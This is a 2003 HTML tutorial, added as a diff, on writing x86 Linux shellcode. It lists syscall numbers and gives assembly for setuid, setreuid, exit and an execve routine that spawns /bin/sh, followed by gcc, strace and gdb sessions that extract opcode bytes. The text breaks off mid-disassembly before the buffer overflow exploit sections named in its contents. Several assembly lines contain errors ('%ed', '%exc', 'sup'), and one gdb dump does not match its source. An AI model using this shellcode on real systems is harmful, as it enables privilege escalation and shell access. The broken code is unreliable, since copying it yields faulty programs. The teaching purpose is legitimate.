@@ -1,0 +1,870 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Introduction to Linux bytecode</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<BODY link=#6B8E23 alink=#6B8E23 vlink=#6B8E23 text=#000000 bgColor=#ffffff>
+<div align="center"><img src="../../../archive/tripbit.org/articles/programing/tripbit_logo.png" width="174" height="128"><br>
+  <br>
+  <font size="3" face="Verdana, Arial, Helvetica, sans-serif"><strong>Introduction
+  to Linux bytecode</strong></font><br>
+  <br>
+</div>
+<table width="83%" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="56%"><div align="right"><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>Author:&nbsp; </font></div></td>
+    <td width="44%"><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>posidron</font></td>
+  </tr>
+  <tr>
+    <td><div align="right"><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>Contact:&nbsp; </font></div></td>
+    <td><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2><a href="posidron@mail.com">posidron@tripbit.org</a></font></td>
+  </tr>
+  <tr>
+    <td><div align="right"><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>Website:&nbsp; </font></div></td>
+    <td><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2><a href="www.tripbit.org">tripbit.org</a></font></td>
+  </tr>
+  <tr>
+    <td><div align="right"><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>Date:&nbsp;</font></div></td>
+    <td><font face="Verdana, Arial, Helvetica, sans-serif"
+size=2>Aug., 23th 2003</font></td>
+  </tr>
+</table>
+<br>
+<HR SIZE=1>
+<br>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr bgcolor="#A7BDA6">
+    <td width="100%" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Table
+      of contents</strong></font></td>
+  </tr>
+  <tr bgcolor="#A7BDA6">
+    <td valign="top" bgcolor="#FFFFFF"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">0.
+      Environment <br>
+      1. System calls<br>
+      1.1 setuid<br>
+      1.2 setgid<br>
+      1.3 setreuid<br>
+      1.4 setregid<br>
+      1.5 setresuid<br>
+      1.6 setresgid<br>
+      1.7 execv<br>
+      1.8 exit<br>
+      2. exit() bytecode<br>
+      3. setreuid() bytecode<br>
+      4. execv() bytecode<br>
+      5. Buffer overflow example<br>
+      6. Buffer overflow exploit<br>
+      7. Bibliography</font></td>
+  </tr>
+</table>
+<br>
+<br>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr bgcolor="#A7BDA6">
+    <td colspan="2"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Environment</strong></font></td>
+  </tr>
+  <tr bgcolor="#F6FAF0">
+    <td width="10%"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Kernel:</font></td>
+    <td width="90%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Linux
+      2.4.20-8</font></td>
+  </tr>
+  <tr bgcolor="#F6FAF0">
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Compiler:
+      </font></td>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gcc 3.2.2</font></td>
+  </tr>
+  <tr bgcolor="#F6FAF0">
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Debugger:</font></td>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gdb 5.3post-0.20021129.18rh</font></td>
+  </tr>
+  <tr bgcolor="#F6FAF0">
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Hooker:</font></td>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">strace 4.4</font></td>
+  </tr>
+</table>
+<br>
+<br>
+<font color="#333333"><em>&#8226; </em></font><FONT face="Verdana, Arial, Helvetica, sans-serif" size=2><B></B></FONT><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>System
+calls</strong><br>
+<br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setuid(0);
+      </strong>- set user id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="14%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="16%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="10%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="9%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="8%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="12%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setuid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">23</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      mov $0x17, %eax <br>
+      int $0x80 </font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      </font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      1, set ebx register to 0 (user_id)<br>
+      copy syscall(converted to hex) to eax register <br>
+      interupt to execute syscall </font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setgid(0);</strong>
+      - set group id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="14%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="16%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="10%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="9%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="8%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="12%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setgid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">46</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      mov $0x2e, %eax<br>
+      int $0x80</font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      </font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      1, set ebx register to 0 (group_id)<br>
+      copy syscall(converted to hex) to eax register<br>
+      interupt to execute syscall </font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setreuid(0,0);
+      </strong>- set real and effective user id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="14%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="16%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="10%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="9%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="8%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="12%" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setreuid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">70</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      xor %ecx, %ecx <br>
+      mov $0x46, %eax <br>
+      int $0x80 </font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      </font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      2, set ebx register to 0 (reale_user_id)<br>
+      argument 1, set ecx register to 0 (effective_user_id)</font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      copy syscall(converted to hex) to eax register </font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      interupt to execute syscall</font> </td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="987" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setregid(0,0);
+      </strong>- set real and effective group id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="199" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="224" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="139" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="129" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="116" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="166" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setregid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">71</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      xor %ecx, %ecx <br>
+      mov $0x47, %eax <br>
+      int $0x80</font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      2, set ebx register to 0 (reale_group_id)<br>
+      argument 1, set ecx register to 0 (effective_group_id)</font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      copy syscall(converted to hex) to eax register </font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      interupt to execute syscall</font> </td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="987" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setresuid(0,0,0);
+      </strong>- set real, effective and saved user id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="200" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="224" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="135" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="129" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="116" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="169" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setresuid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">164</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">uid_t</font></td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      xor %ecx, %ecx <br>
+      xor %edx, %ed<br>
+      mov $0xA4,%eax <br>
+      int $0x80 </font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      3, set ebx register to 0 (reale_user_id)<br>
+      argument 2, set ecx register to 0 (effective_user_id)<br>
+      argument 1, set edx register to 0 (saved_user_id)</font> <font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      copy syscall(converted to hex) to eax register <br>
+      interupt to execute syscall </font> </td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="987" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setresgid(0,0,0);
+      </strong>- set real, effective and saved group id</font></td>
+  </tr>
+  <tr valign="top">
+    <td width="200" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="229" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="134" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="124" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="117" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="169" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_setresgid</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/sys.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">170</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">gid_t</font></td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      xor %ecx, %exc<br>
+      xor %edx, %edx<br>
+      mov $0xAA, %eax<br>
+      int $0x80</font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      3, set ebx register to 0 (reale_group_id)<br>
+      argument 2, set ecx register to 0 (effective_group_id)<br>
+      argument 1, set edx register to 0 (saved_group_id) <br>
+      copy syscall(converted to hex) to eax register <br>
+      interupt to execute syscall </font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="987" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>execve();</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td width="200" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="228" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="135" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="125" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="109" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="176" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_execve</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">i386/kernel/process.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">11</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">struct
+      pt_regs</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %eax, %eax<br>
+      push %eax <br>
+      push $0x68732f2f <br>
+      push $0x6e69622f <br>
+      mov %esp, %ebx <br>
+      push %eax <br>
+      push %ebx <br>
+      mov %esp, %ecx<br>
+      xor %edx, %edx<br>
+      mov $0xb,%eax<br>
+      int $0x80</font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">
+      set eax register to 0 <br>
+      push eax on the stack <br>
+      push //sh on the stack <br>
+      push /bin on the stack <br>
+      wrote the starting address of string to ebx register <br>
+      terminate the **argv <br>
+      create char **argv <br>
+      write the address to ecx register<br>
+      set edx register to 0<br>
+      move syscall(converted to hex) to eax register<br>
+      interupt to execute syscall</font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font>
+<table width="987" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td colspan="6" bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>exit(0);</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td width="199" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Name</font></td>
+    <td width="230" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Source</font></td>
+    <td width="134" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%eax</font></td>
+    <td width="125" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ebx</font></td>
+    <td width="110" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%ecx
+      </font></td>
+    <td width="175" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">%edx</font></td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">sys_exit</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">kernel/exit.c</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">1</font></td>
+    <td bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">int</font></td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+    <td bgcolor="#F6FAF0">&nbsp;</td>
+  </tr>
+  <tr valign="top" bgcolor="#CED8CD">
+    <td colspan="6">&nbsp;</td>
+  </tr>
+  <tr valign="top">
+    <td bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">xor
+      %ebx, %ebx<br>
+      mov $0x1, %eax <br>
+      int $0x80 </font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+      </font></td>
+    <td colspan="5" bgcolor="#F6FAF0"><font size="2" face="Verdana, Arial, Helvetica, sans-serif">argument
+      1, set ebx register to 0<br>
+      copy syscall(converted to hex) to eax register <br>
+      interupt to execute syscall </font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<br>
+</font><font color="#333333"><em>&#8226; </em></font><strong><font size="2" face="Verdana, Arial, Helvetica, sans-serif">exit()
+bytecode</font></strong><br>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>exit_asm.c</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">
+      int main (void) {<br>
+      &nbsp;&nbsp;__asm__(&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %eax, %eax // clear %eax for this syscall<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %ebx, %ebx <br>
+      &nbsp;&nbsp;&nbsp;&nbsp;mov $0x1, %al // instead of %eax to erease the 0
+      bytes<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;int $0x80<br>
+      &nbsp;&nbsp;&quot;);<br>
+      }</font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<font face="Courier New, Courier, mono">[posidron@localhost posidron]$ gcc exit_asm.c
+-o exit_asm<br>
+[posidron@localhost posidron]$ strace ./exit_asm<br>
+execve(&quot;./exit_asm&quot;, [&quot;./exit_asm&quot;], [/* 32 vars */]) = 0<br>
+.<br>
+.<br>
+.<br>
+_exit_group(0) = ?<br>
+[posidron@localhost posidron]$ gdb -q ./exit_asm<br>
+(gdb) disas main<br>
+Dump of assembler code for function main:<br>
+0x80482f4 &lt;main+0&gt;: push %ebp<br>
+0x80482f5 &lt;main+1&gt;: mov %esp,%ebp<br>
+0x80482f7 &lt;main+3&gt;: sup $0x8, %esp<br>
+0x80482fa &lt;main+6&gt;: and $0xfffffff0,%esp<br>
+0x80482fd &lt;main+9&gt;: mov $0x0,%eax<br>
+0x8048302 &lt;main+14&gt;: sub %eax,%ebx<br>
+0x8048304 &lt;main+16&gt;: xor %eax,%eax<br>
+0x8048306 &lt;main+18&gt;: xor %ebx,%ebx<br>
+0x8048308 &lt;main+20&gt;: mov $0x1, %al<br>
+0x804830a &lt;main+22&gt;: int $0x80<br>
+0x804830c &lt;main+24&gt;: leave<br>
+0x804830d &lt;main+25&gt;: ret<br>
+0x804830e &lt;main+26&gt;: nop<br>
+0x804830f &lt;main+27&gt;: nop<br>
+End of assembler dump.<br>
+(gdb) x/bx main+16<br>
+0x8048304 &lt;main+16&gt;: 0x31<br>
+(gdb)<br>
+0x8048305 &lt;main+17&gt;: 0xc0<br>
+(gdb)<br>
+0x8048306 &lt;main+18&gt;: 0x31<br>
+(gdb)<br>
+0x8048307 &lt;main+19&gt;: 0xdb<br>
+(gdb)<br>
+0x8048308 &lt;main+20&gt;: 0xb0<br>
+(gdb)<br>
+0x8048309 &lt;main+21&gt;: 0x01<br>
+(gdb)<br>
+0x804830a &lt;main+22&gt;: 0xcd<br>
+(gdb)<br>
+0x804830b &lt;main+23&gt;: 0x80<br>
+(gdb) quit<br>
+[posidron@localhost posidron]$</font><br>
+<br>
+<br>
+</font><font color="#333333"><em>&#8226; </em></font><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setreuid()
+bytecode</strong><br>
+<br>
+</font>
+<table width="100%" border="0" cellspacing="2" cellpadding="0">
+  <tr valign="top">
+    <td bgcolor="#A7BDA6"><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>setreuid_asm.c</strong></font></td>
+  </tr>
+  <tr valign="top">
+    <td height="128" bgcolor="#F6FAF0"><font size="2" face="Courier New, Courier, mono">
+      int main (void) {<br>
+      &nbsp;&nbsp;__asm__(&quot;<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %eax, %eax // clear %eax for this syscall<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %ebx, %ebx<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;xor %ecx, %ecx<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;mov $0x46, %al // instead of %eax to erease the
+      0 bytes<br>
+      &nbsp;&nbsp;&nbsp;&nbsp;int $0x80<br>
+      &nbsp;&nbsp;&quot;);<br>
+      }</font></td>
+  </tr>
+</table>
+<font size="2" face="Verdana, Arial, Helvetica, sans-serif"><br>
+<font face="Courier New, Courier, mono">[posidron@localhost posidron]$ gcc setreuid_asm.c
+-o setreuid_asm<br>
+[posidron@localhost posidron]$ su<br>
+Password:<br>
+[root@localhost posidron]# strace ./setreuid_asm<br>
+execve(&quot;./setreuid_asm&quot;, [&quot;./setreuid_asm&quot;], [/* 31 vars */])
+= 0<br>
+.<br>
+.<br>
+.<br>
+setreuid(0, 0) = 0<br>
+_exit_group(0) = ?<br>
+[root@localhost posidron]# exit<br>
+[posidron@localhost posidron]$ gdb -q ./setreuid_asm<br>
+(gdb) disas main<br>
+Dump of assembler code for function main:<br>
+0x80482f4 &lt;main+0&gt;: push %ebp<br>
+0x80482f5 &lt;main+1&gt;: mov %esp,%ebp<br>
+0x80482f7 &lt;main+3&gt;: sup $0x8, %esp<br>
+0x80482fa &lt;main+6&gt;: and $0xfffffff0,%esp<br>
+0x80482fd &lt;main+9&gt;: mov $0x0,%eax<br>
+0x8048302 &lt;main+14&gt;: sub %eax,%ebx<br>
+0x8048304 &lt;main+16&gt;: xor %eax,%ebx<br>
+0x8048306 &lt;main+18&gt;: xor %ebx,%ebx<br>
+0x8048308 &lt;main+20&gt;: xor %ecx,%ecx<br>
+0x804830a &lt;main+22&gt;: mov $0x46, %al<br>
